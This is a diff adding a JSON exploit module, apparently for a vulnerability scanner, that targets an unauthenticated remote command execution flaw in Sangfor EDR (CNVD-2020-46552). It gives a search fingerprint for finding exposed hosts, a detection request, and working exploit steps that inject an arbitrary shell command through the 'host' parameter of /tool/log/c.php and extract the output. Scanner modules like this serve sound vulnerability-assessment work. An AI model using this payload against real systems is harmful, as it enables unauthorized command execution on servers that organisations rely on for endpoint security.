@@ -1,0 +1,88 @@
+{
+  "Name": "Sangfor EDR unauthorized RCE (CNVD-2020-46552)",
+  "Description": "终端检测响应平台（EDR）是由深信服科技股份有限公司开发的终端安全解决方案。EDR管理平台支持统一化的终端资产管理、终端病毒查杀、终端合规性检查和访问控制策略管理，支持对安全事件的一键隔离处置，以及对热点事件IOC的全网威胁定位。攻击者利用该漏洞，可在未授权的情况下向目标服务器发送恶意构造的HTTP请求，从而获得目标服务器的权限，实现远程命令执行。",
+  "Product": "Sangfor EDR",
+  "Homepage": "https://edr.sangfor.com.cn/",
+  "DisclosureDate": "2020-08-18",
+  "Author": "itardc@163.com",
+  "FofaQuery": "(cert=\"Organization: INFOSEC\" && cert=\"CommonName: 222.222.222.0\") || (body=\"/ui/static/css/login.\" && body=\"/ui/static/js/login.\")",
+  "GobyQuery": "",
+  "Level": "3",
+  "Impact": "攻击者利用该漏洞，可在未授权的情况下向目标服务器发送恶意构造的HTTP请求，从而获得目标服务器的权限，实现远程命令执行。",
+  "Recommendation": "深信服官方已发布更新版本和修复补丁，更新至3.2.21版本或升级补丁可修复该漏洞。",
+  "References": [
+    "https://www.cnvd.org.cn/webinfo/show/5677"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "cmd",
+      "type": "input",
+      "value": "whoami"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+        "uri": "/tool/log/c.php?strip_slashes=system&host=md5sum"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "d41d8cd98f00b204e9800998ecf8427e",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+        "uri": "/tool/log/c.php?strip_slashes=system&host={{{cmd}}}"
+      },
+      "SetVariable": [
+        "output|lastbody|regex|(?s)</b></p>(.*?)\n<pre>"
+      ]
+    }
+  ],
+  "Tags": [
+    "rce",
+    "unauthorized"
+  ],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": ["Sangfor-EDR"]
+  }
+}
